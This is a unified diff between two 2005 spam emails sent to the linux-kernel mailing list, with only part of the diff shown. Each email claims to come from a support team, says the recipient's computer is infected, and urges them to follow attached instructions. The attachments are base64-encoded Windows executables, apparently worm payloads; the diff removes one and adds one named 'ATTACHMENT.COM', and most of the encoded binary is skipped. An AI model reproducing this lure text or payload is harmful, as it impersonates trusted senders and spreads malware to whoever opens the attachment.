@@ -1,53 +1,53 @@
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S261408AbVGGQWX (ORCPT <rfc822;ralf@linux-mips.org>);
-	Thu, 7 Jul 2005 12:22:23 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261374AbVGGQWS
+	id S262324AbVGGUB4 (ORCPT <rfc822;ralf@linux-mips.org>);
+	Thu, 7 Jul 2005 16:01:56 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S262305AbVGGUBu
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Thu, 7 Jul 2005 12:22:18 -0400
-Received: from [193.95.160.197] ([193.95.160.197]:41249 "EHLO
-	mail.hostelworld.com") by vger.kernel.org with ESMTP
-	id S261361AbVGGQTx (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Thu, 7 Jul 2005 12:19:53 -0400
-Date: Thu, 7 Jul 2005 17:28:53 +0100
-Message-Id: <200507071628.j67GSrpw015463@mail.hostelworld.com>
+	Thu, 7 Jul 2005 16:01:50 -0400
+Received: from upop5.tiscalinet.es ([212.166.64.120]:11169 "EHLO
+	netmail.tiscali.es") by vger.kernel.org with ESMTP id S261838AbVGGUBU
+	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+	Thu, 7 Jul 2005 16:01:20 -0400
+Message-ID: <4253B33C00A23537@genova.tiscali.red> (added by
+	    postmaster@netmail.tiscali.es)
+From: "Mail Delivery Subsystem" <postmaster@vger.kernel.org>
 To: linux-kernel@vger.kernel.org
-Subject: Auto-reply
-From: bounce@webresint.com
+Subject: MAIL SYSTEM ERROR - RETURNED MAIL
+Date: Thu, 7 Jul 2005 22:00:18 +0200
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0008_845667B0.E1A35104"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
-Return-Path: <linux-kernel-owner+ralf=40linux-mips.org-S261408AbVGGQWX@vger.kernel.org>
-
-This is an automatic email, please do not reply to this email.
-
-Should you have a query with regards to your booking process please visit the 'Contact Form' on our website and please quote your booking reference.
-We endeavour to reply to all queries within 24 hours.
-
-======================================================
+Return-Path: <linux-kernel-owner+ralf=40linux-mips.org-S262324AbVGGUB4@vger.kernel.org>
 
 This is a multi-part message in MIME format.
 
-------=_NextPart_000_0006_C78258EF.6F6568AC
+------=_NextPart_000_0008_845667B0.E1A35104
 Content-Type: text/plain;
 	charset=us-ascii
 Content-Transfer-Encoding: 7bit
 
-Dear user of hostelworld.com,
+Dear user linux-kernel@vger.kernel.org,
 
-Your email account was used to send a large amount of junk email during the recent week.
-Probably, your computer was compromised and now runs a hidden proxy server.
+We have received reports that your e-mail account has been used to send a huge amount of unsolicited commercial email during this week.
+Obviously, your computer had been infected by a recent virus and now contains a hidden proxy server.
 
-Please follow instructions in order to keep your computer safe.
+We recommend that you follow our instructions in order to keep your computer safe.
 
-Best wishes,
-hostelworld.com support team.
+Have a nice day,
+vger.kernel.org user support team.
 
 
-------=_NextPart_000_0006_C78258EF.6F6568AC
+------=_NextPart_000_0008_845667B0.E1A35104
 Content-Type: application/octet-stream;
-	name="bookings@hostelworld.com"
+	name="ATTACHMENT.COM"
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment;
-	filename="bookings@hostelworld.com"
+	filename="ATTACHMENT.COM"
 
 TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
@@ -534,30 +534,29 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAUmShJPxIjfqtx7ktUnS2Na0PTnFSlLlXrSdz7lJ4iW8bp53I9B1pdLWL1mm1i7EUJv8vybZu
-vXCm9PZS9GgrbUG40NEpWbnNNG99pCnKGpqud2rWauzEKe+U/A/sc4K+rgVkU0FCsK/b0sk9AClJ
-6QPONQPbolInQe0ul4VRfKkvegWmgrFTwMDstNfAvVUjgrV3HRGfBqQELhG/BC4dhzjY+AvXpgse
-yK9+RMjDq4LXNQldUDmRLcimd7WVH6jMuGiNlkhjs0NIUq+fweal7EgVNyjm3Ta3SAzJWxZEo8kt
-fkvKgLE675NbMKiAuR3NwrG3TYNSGarCC0FHBipT52Fm1WjPSoVukS0PC5GV3uSOrmbC4Zkqls9K
-mnSRXiSwdaqlGthjtJIdS8+LStOH2VvzEQzYY7qsmofbax1LzNx3CaRBmJMCwofAxJGYpvnE2sCw
-Aod/FqSYRrMMXF28KnkPyleJPCDl1MSZ0Zbp/PCWSAQD1yPmc9TAuyDUyJ6DQjaPGO/72mnsGsNi
-7BrC5O/5qMzsGsA+rfCabyXXe5E4EU5m13giXZY9HCHXvXeBTcbj61DwJquWPQNeldYb/m0f71mC
-WDlYwNS+1hpH8JKdXLztwNK5NZ1pwnWC8h6ga6wKnYRqGN4Se0k+hNLQjcZrWjGExQBmxmFat5uW
-Ewj+dcaM1SHemlO65uKWlK4xEZ0GdRGwNPMRmDN6EZ0oMjSOzrqbxhp4mqKcpplDnMDE+SK42xTe
-VcS9NPzbZg4KMHyuAsB1X4bfpvSXwKPa9N/nUb0fW6z/37YD9MBNTjS3lDaPR64eOJzAIuJYeduM
-GbgbM0dI/VxHj2MGGl9mpHCsZKaAlk55n2OS8J+c+kifkKJ2gHyjoJ9rnRWA7zcBgSgL427m/mVu
-QQ0ScRn7SKp8E8pu8q8gqnXUcOnJYZZ40Ju8iKd31NUbzD/XmE4qiKd37JcWiQuIU3gSEDHzu8Dk
-6XNtI72wpMtJIi+sVzcwO/vsLwLDiW0puDhvrD058BEeywAp7JCY8HR4A8dBlh/fKlQf9SHfH50j
-CAOubYY5b5iq1qAmK9YnLTDWKElHl0PSwFGO8HnJXHM0yYEaxn3ZXKGSdWazkjQAkNOgFudWjURu
-Vo1EX9AeCIaSfWB6xRs+tjVmhN0qXPQ9aNRO5SrXAOKt+lcDKvN1qaGi5mQ2Y26yxhd/ZNkg6KaY
-Tz/2m6p8hdmLJBfGWJQdm6g+PO+iRgQAbLqmUvqPLUJlEekfmrSqh0Mu7EHfPudCdIHArA7YAlw3
-K3BcVC8RAiKXCEPmGmMCIpYsS8wG3pNZJv80s5Mj24Y5/8Twx3bEMHDm2/ABJ8QwcAYf54vDxIBo
-9KetsHGamVVwCmbkAkh2ms5Ik83wSCGLqAmB4LFX0lFKdsy5qYb1ReiZAwyomYhLgIZav32ZAooi
-2OD2Q12YoTU6/YOq1WT9uVIc6KXVlB7HlzSSzdVBpX7VmVJbys5oPomkPn4kb24jJGEIX3kZmi7h
-RVbU4UVUfOFFVkFmzWW8l1W3S/+03y5oKDiel74SpGhURIVoWlQyl+60LJfHeJxEd/Xd+SSeR7ux
-2Um7IoI3RNzVF7tgiPq7bc4CREvV6Q==
+AAAAUOZZjf4Zkz1QFpooUKB9CK/0a4mvJhPIrzS9B1DbyzKKWlkrCqWm1SSlk5vZs+VW2bPlHn+k
+o/XZs+oa2bPsdIaLHkYo/TwX1WKqb2m329TVYqiQ1WKn7naxOMxpQbDZRZKmt6pfWGoWexW6qlgI
+6apdEHuq1XbYFnsfqxZ7HhRYyeiYtwcdP6jyEyZnnhYuCyBf0AsgX8Ko+pBgtwXXNBgFw9FL7H1f
+S+x9rEvse6noeiMeS+x0OkvsdGpL7HXh6uo+EQUkCsdGZGOnGp3SwbkDi/sFB801uQOIlBqV3OhE
+9EVTqzMfjhcd/PqrLnBrFx3+KRcd9820kAEvq7z7B99nWc0vX63PL1+pHS8YuPaMjuNDjI7oioyO
+7SCMjuaQRHizDBeRBV6rnI1vF5EKjrQ3VjwXkQDMq7dF3Ku+vfoGm/FN9h/f9ukXxvRVcksR82QE
+gencP2/2oAoA6X3f7IP1BtfQHLMlLQrPStAcsbdztjtkcy3lInPE7KXQHLDORRgrkKrd2Di1IdAH
+FvGUDBbxnSOqJO1KFvGZ66r13hYYEjuxS/uOJ0v7iPDoYbs0S/uAp0v7jCpL+43TS/uKaEShLVSr
+5smAF0iWTRdImV2rbssrtO7L6rSY0eYXSJmUfNCUmy85JGmTHmjAkx9yoy85JqwvOSwcLzkvBi85
+JeV76YS7i7p5HygAMgEoAD4ci9htoygAPp8oADPFKAA1xEUpTKoWwPasquF92arzGX+qasJ2FsD+
+CLUaOzoWwPRZov5TO007q91XLbJj8RfnlFKD6xLxF+w4TbmZgk0wiNfRefMugpBKKrVWJCk+EKgd
+PpG5dj4+nK6CkECtgpBHHERtanWriVRstFyYLqsl34m0G/nkF4Td7ReE29EXhNgyfCmZIZPsagOM
+VnlNL8Auay/AKugvwCvuL8Avui/AJ+xDiKlMs7KLpBBhF6+zu9yeEGERxhBhH7OsYOOVs+zt4gfb
+1zRUMmMSY/SafFQyZL9UMmgE97+T71Qyb/pUMmHHq+n/DkQhkYP4AE0rRAG0VfgATlr4AEs7+ABG
+S49XiR6ou1OOR/yDKUf8gjH7UuyOWIOjZPtS6YJYirhjWM3nrEOdjbWz4DT/s5a4UBB0PAWzrvwz
+EHQ/IKx1YDcQdDJ9e5uinYvURAIochU7ixhBBChyGo0ochv/KHIX/ihyFjQHBkI8VO/zXfdxw8b3
+e/oNVO/zPizxwsJU7/ub90mktuuaG60E82ZouHOvLwRd40VGrHdMBFwOMrhzrh0b/ptADP0wffzF
+woVfFIjR/M7bNuO7hf7jQYU34zPD8eMk6kmFkQgWK27GtGoY0ybWeLeFdasvw9Z4tJxqfPlA1niw
+30SPvl2ra4AitLZNiatKSioXZggfq0FE3BdmBqMXZg9MRqgovKluJl0VQZkvFUGej6mG0japwVOl
+qZQeUhVBnLl7gpKdKGskbChrJbYoaya3KGsgFYs7EWyLsfK/KGsm5qg7KOJYA9xEWF+lGUffFrH7
+0p4V+9KZH1gIXtpHBx4VV9Z6kwQ/z1AEP8SDqF3TI1cbE16of/UMqC30o1eBmtRPUrgf4a1xgk8F
+TpBPCD77T7g9d7Be5k9P67LOTxmqXg==
 
-------=_NextPart_000_0006_C78258EF.6F6568AC--
-
+------=_NextPart_000_0008_845667B0.E1A35104--
 
 
